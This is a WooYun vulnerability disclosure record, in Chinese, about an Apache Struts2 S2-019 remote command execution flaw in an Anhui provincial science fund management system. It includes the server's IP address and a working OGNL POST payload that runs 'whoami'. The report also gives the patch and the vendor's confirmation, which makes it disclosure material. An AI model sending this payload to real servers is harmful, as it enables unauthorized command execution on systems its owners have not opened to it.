{"id": 42149, "wybug_id": "wooyun-2014-086639", "wybug_title": "安徽省自然科学基金管理系统S2-019漏洞可远程执行命令", "wybug_corp": "安徽省自然科学基金管理系统", "wybug_author": "无忧泉", "wybug_date": "2014-12-11 12:00", "wybug_open_date": "2015-01-25 12:02", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方框架", "远程命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-25：\t细节向公众公开  简要描述： 未及时更新apach补丁，可以远程执行命令 详细说明：  通过post方式向http://218.22.27.67/Ahzrjj/index.action主页提交如下post form信息：\ndebug=command&expression=#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'whoami'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[1000],#d.read(#e),#resp.println(#e),#resp.close()\n   漏洞证明：  \n\n   修复方案：  Apache Group已经为此发布了一个安全公告（s2-019）以及相应补丁:s2-019：S2-019链接：http://struts.apache.org/release/2.3.x/docs/s2-019.html补丁下载：http://struts.apache.org/download.cgi#struts23152   版权声明：转载请注明来源 无忧泉@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-12-16 11:41 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发给安徽分中心，由安徽分中心后续协调网站管理单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}